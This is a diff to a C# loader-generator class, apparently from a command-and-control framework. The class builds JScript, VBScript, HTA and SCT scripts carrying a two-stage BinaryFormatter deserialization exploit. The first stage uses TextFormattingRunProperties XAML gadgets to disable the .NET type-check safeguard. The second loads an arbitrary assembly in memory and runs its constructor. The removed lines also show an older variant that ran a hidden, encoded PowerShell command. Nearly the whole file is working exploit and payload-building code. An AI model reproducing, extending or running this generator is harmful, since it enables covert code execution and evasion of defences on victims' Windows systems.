@@ -5,25 +5,23 @@ namespace C2.Features.Loaders;
 public enum ScriptFormat { JScript, VBScript, Hta, Sct }
 
 /// <summary>
-/// Generates scripts (JScript / VBScript / HTA / SCT) using two-stage
-/// TextFormattingRunProperties deserialization.  Everything executes during
-/// BinaryFormatter.Deserialize_2() — zero post-deserialization method calls.
+/// Two-stage BinaryFormatter exploitation via TextFormattingRunProperties NRBF.
 ///
-/// Stage 1 — Disable .NET 4.8+ type check:
-///   TextFormattingRunProperties XAML with ObjectDataProvider chains that
-///   set disableActivitySurrogateSelectorTypeCheck = true.
+/// Stage 1 — Disable .NET 4.8+ ActivitySurrogateSelectorTypeCheck:
+///   XAML ObjectDataProvider chain reflects into the internal AppSettings field
+///   and sets the ConfigurationManager key.  Throws after — caught by script.
 ///
-/// Stage 2 — Load assembly + trigger constructor:
-///   TextFormattingRunProperties XAML with ObjectDataProvider chains:
-///     Convert.FromBase64String(dllBase64) → byte[]
-///     Assembly.Load(byte[]) → Assembly    (via StaticResource chaining)
-///     Assembly.CreateInstance(entryClass)  (via ObjectInstance chaining)
+/// Stage 2 — Load assembly + trigger constructor (pure in-process, no PowerShell):
+///   XAML embeds raw assembly bytes via x:Array directly in MethodParameters.
+///   x:Array is a XAML intrinsic value (not a DataSourceProvider), so it resolves
+///   correctly in MethodParameters — unlike ObjectDataProvider results.
+///   Chain: Assembly.Load(byte[]) → Assembly.CreateInstance(entryClass).
+///   ObjectInstance="{StaticResource ...}" auto-resolves the ODP to the Assembly.
 ///
-/// Script flow:
-///   try { Deserialize_2(stage1); }  // disables type check, throws after
-///   catch { try { Deserialize_2(stage2); } catch {} }  // assembly loads + constructor runs
+/// Both stages are hand-built NRBF (one class, one string member) — no
+/// BinaryFormatter.Serialize needed, runs entirely in WASM.
 ///
-/// Requires Microsoft.PowerShell.Editor.dll (Windows 8+ default).
+/// Requires Microsoft.PowerShell.Editor.dll (ships with Windows 8+).
 /// </summary>
 public static class InsecureDeserializationGenerator
 {
@@ -31,13 +29,13 @@ public static class InsecureDeserializationGenerator
         Convert.ToBase64String(BuildStage1Nrbf()));
 
     /// <summary>
-    /// Generates two-stage script: Stage 1 (type check disable) + Stage 2 (assembly load + CreateInstance).
+    /// Two-stage payload: type-check bypass + in-process assembly load.
     /// </summary>
-    public static string Generate(string assemblyBase64, string entryClass,
+    public static string Generate(byte[] assemblyBytes, string entryClass,
         ScriptFormat format, string runtimeVersion)
     {
         var s1 = Stage1Base64.Value;
-        var s2 = Convert.ToBase64String(BuildStage2Nrbf(assemblyBase64, entryClass));
+        var s2 = Convert.ToBase64String(BuildStage2Nrbf(assemblyBytes, entryClass));
         return format switch
         {
             ScriptFormat.JScript  => BuildJScript(s1, s2, runtimeVersion),
@@ -64,10 +62,11 @@ public static class InsecureDeserializationGenerator
         };
     }
 
-    // ── NRBF Builders ───────────────────────────────────────────────────
+    // ── NRBF Stage Builders ──────────────────────────────────────────────
 
     /// <summary>
-    /// Stage 1: TextFormattingRunProperties with XAML to disable type check.
+    /// Stage 1: TextFormattingRunProperties XAML that disables the .NET 4.8+
+    /// ActivitySurrogateSelectorTypeCheck via reflection + AppSettings.
     /// </summary>
     private static byte[] BuildStage1Nrbf()
     {
@@ -95,7 +94,7 @@ public static class InsecureDeserializationGenerator
                         <s:Boolean>true</s:Boolean>
                     </ObjectDataProvider.MethodParameters>
                 </ObjectDataProvider>
-                <ObjectDataProvider x:Key="setMethod" ObjectInstance="{x:Static c:ConfigurationManager.AppSettings}" MethodName="Set">
+                <ObjectDataProvider x:Key="cfg" ObjectInstance="{x:Static c:ConfigurationManager.AppSettings}" MethodName="Set">
                     <ObjectDataProvider.MethodParameters>
                         <s:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</s:String>
                         <s:String>true</s:String>
@@ -108,100 +107,96 @@ public static class InsecureDeserializationGenerator
     }
 
     /// <summary>
-    /// Stage 2: TextFormattingRunProperties with XAML that loads assembly from
-    /// base64 and calls CreateInstance to trigger the constructor.
+    /// Stage 2: TextFormattingRunProperties XAML that embeds raw assembly bytes
+    /// via x:Array and chains Assembly.Load(byte[]) → CreateInstance(entryClass).
     ///
-    /// ObjectDataProvider chain:
-    ///   1. Convert.FromBase64String(b64) → byte[]
-    ///   2. Assembly.Load(byte[]) → Assembly  (byte[] passed via StaticResource)
-    ///   3. Assembly.CreateInstance(className) → constructor runs
+    /// x:Array is a XAML language intrinsic — when placed directly inside
+    /// ObjectDataProvider.MethodParameters it produces a real Byte[], not a
+    /// DataSourceProvider wrapper.  This sidesteps the well-known limitation
+    /// where ObjectDataProvider results in MethodParameters are NOT auto-resolved.
+    ///
+    /// The second ObjectDataProvider uses ObjectInstance="{StaticResource a}"
+    /// which DOES auto-resolve DataSourceProviders → gets the loaded Assembly.
     /// </summary>
-    private static byte[] BuildStage2Nrbf(string assemblyBase64, string entryClass)
+    private static byte[] BuildStage2Nrbf(byte[] assemblyBytes, string entryClass)
     {
-        // Strategy: Use Environment variable as a bridge between ObjectDataProviders.
-        // Step 1: Store the base64 DLL in env var "_PAYLOAD"
-        // Step 2: Get AppDomain.CurrentDomain (static property → instance)
-        // Step 3: Call a helper chain:
-        //   Environment.GetEnvironmentVariable("_PAYLOAD") → string
-        //   Convert.FromBase64String(string) → byte[]
-        //   Assembly.Load(byte[]) → Assembly
-        //   Assembly.CreateInstance(className) → constructor runs
-        //
-        // Since ObjectInstance chaining DOES auto-resolve DataSourceProviders but
-        // MethodParameters does NOT, we use Environment as the intermediary to
-        // pass data between steps without MethodParameters chaining.
-        //
-        // The trick: set env var in step 1, then in step 2 use a PowerShell-style
-        // approach... but actually we can chain ObjectInstance calls:
-        //   Step 1: Environment.SetEnvironmentVariable("_P", base64) — static, literal params ✓
-        //   Step 2: Environment.GetEnvironmentVariable("_P") → string — static, literal params ✓
-        //   Step 3: Convert.FromBase64String(string) — BUT needs step 2 result as param ✗
-        //
-        // Still stuck on passing results through MethodParameters.
-        // SOLUTION: Use Process.Start with a PowerShell one-liner that does the work.
-        // The PS command loads the assembly and triggers the constructor — no file on disk.
+        var sb = new StringBuilder(assemblyBytes.Length * 20 + 512);
 
-        var psCommand = "[Reflection.Assembly]::Load([Convert]::FromBase64String('" +
-            assemblyBase64 + "')).CreateInstance('" + entryClass + "')";
-        var psBytes = System.Text.Encoding.Unicode.GetBytes(psCommand);
-        var psEncoded = Convert.ToBase64String(psBytes);
+        sb.Append("<ResourceDictionary")
+          .Append(" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"")
+          .Append(" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"")
+          .Append(" xmlns:s=\"clr-namespace:System;assembly=mscorlib\"")
+          .Append(" xmlns:r=\"clr-namespace:System.Reflection;assembly=mscorlib\">");
 
-        var xaml = "<ResourceDictionary\n" +
-            "    xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"\n" +
-            "    xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"\n" +
-            "    xmlns:s=\"clr-namespace:System;assembly=mscorlib\"\n" +
-            "    xmlns:d=\"clr-namespace:System.Diagnostics;assembly=System\">\n" +
-            "    <ObjectDataProvider x:Key=\"cmd\" ObjectType=\"{x:Type d:Process}\" MethodName=\"Start\">\n" +
-            "        <ObjectDataProvider.MethodParameters>\n" +
-            "            <s:String>powershell</s:String>\n" +
-            "            <s:String>-nop -w hidden -enc " + psEncoded + "</s:String>\n" +
-            "        </ObjectDataProvider.MethodParameters>\n" +
-            "    </ObjectDataProvider>\n" +
-            "</ResourceDictionary>";
+        // Step 1: Assembly.Load(byte[]) — static method, byte[] from x:Array
+        sb.Append("<ObjectDataProvider x:Key=\"a\" ObjectType=\"{x:Type r:Assembly}\" MethodName=\"Load\">")
+          .Append("<ObjectDataProvider.MethodParameters>")
+          .Append("<x:Array Type=\"s:Byte\">");
 
-        return BuildTextFormattingNrbf(xaml);
+        foreach (var b in assemblyBytes)
+            sb.Append("<s:Byte>").Append(b).Append("</s:Byte>");
+
+        sb.Append("</x:Array>")
+          .Append("</ObjectDataProvider.MethodParameters>")
+          .Append("</ObjectDataProvider>");
+
+        // Step 2: Assembly.CreateInstance(entryClass) — triggers constructor
+        sb.Append("<ObjectDataProvider x:Key=\"b\" ObjectInstance=\"{StaticResource a}\" MethodName=\"CreateInstance\">")
+          .Append("<ObjectDataProvider.MethodParameters>")
+          .Append("<s:String>").Append(entryClass).Append("</s:String>")
+          .Append("</ObjectDataProvider.MethodParameters>")
+          .Append("</ObjectDataProvider>");
+
+        sb.Append("</ResourceDictionary>");
+
+        return BuildTextFormattingNrbf(sb.ToString());
     }
 
+    // ── NRBF Writer ──────────────────────────────────────────────────────
+
     /// <summary>
-    /// Builds NRBF for TextFormattingRunProperties with given XAML in ForegroundBrush.
+    /// Builds a minimal NRBF stream: one BinaryLibrary (Microsoft.PowerShell.Editor)
+    /// + one ClassWithMembersAndTypes (TextFormattingRunProperties) with a single
+    /// ForegroundBrush string member containing the XAML payload.
     /// </summary>
     private static byte[] BuildTextFormattingNrbf(string xaml)
     {
         using var ms = new MemoryStream();
         using var w = new BinaryWriter(ms);
 
-        // Header
+        // SerializationHeader: rootId=1, headerId=-1, majorVer=1, minorVer=0
         w.Write((byte)0); w.Write(1); w.Write(-1); w.Write(1); w.Write(0);
 
-        // BinaryLibrary — Microsoft.PowerShell.Editor
+        // BinaryLibrary (id=2)
         w.Write((byte)12); w.Write(2);
-        WritePrefixedString(w, "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
+        WriteLenPrefixed(w, "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
 
-        // ClassWithMembersAndTypes — TextFormattingRunProperties
+        // ClassWithMembersAndTypes (id=1)
         w.Write((byte)5);
         w.Write(1);
-        WritePrefixedString(w, "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties");
-        w.Write(1);                        // 1 member
-        WritePrefixedString(w, "ForegroundBrush");
-        w.Write((byte)1);                  // BinaryType: String
-        w.Write(2);                        // LibraryId
+        WriteLenPrefixed(w, "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties");
+        w.Write(1);                        // member count
+        WriteLenPrefixed(w, "ForegroundBrush");
+        w.Write((byte)1);                  // BinaryType.String
+        w.Write(2);                        // library id
 
-        // Value: XAML string
+        // Member value: BinaryObjectString (id=3) containing XAML
         w.Write((byte)6); w.Write(3);
-        WritePrefixedString(w, xaml);
+        WriteLenPrefixed(w, xaml);
 
-        w.Write((byte)11);                 // MessageEnd
+        // MessageEnd
+        w.Write((byte)11);
         return ms.ToArray();
     }
 
-    private static void WritePrefixedString(BinaryWriter w, string s)
+    private static void WriteLenPrefixed(BinaryWriter w, string s)
     {
         var bytes = Encoding.UTF8.GetBytes(s);
-        Write7BitInt(w, bytes.Length);
+        Write7BitEncodedInt(w, bytes.Length);
         w.Write(bytes);
     }
 
-    private static void Write7BitInt(BinaryWriter w, int value)
+    private static void Write7BitEncodedInt(BinaryWriter w, int value)
     {
         while (value >= 0x80)
         {
@@ -211,7 +206,7 @@ public static class InsecureDeserializationGenerator
         w.Write((byte)value);
     }
 
-    // ── Two-Stage Templates ─────────────────────────────────────────────
+    // ── Two-Stage Script Templates ───────────────────────────────────────
 
     private static int DecodedLen(string b64)
     {
@@ -326,7 +321,7 @@ window.close();
 </scriptlet>";
     }
 
-    // ── Single-Stage Templates ──────────────────────────────────────────
+    // ── Single-Stage Script Templates ────────────────────────────────────
 
     private static string BuildJScriptSingle(string b64, string ver)
     {
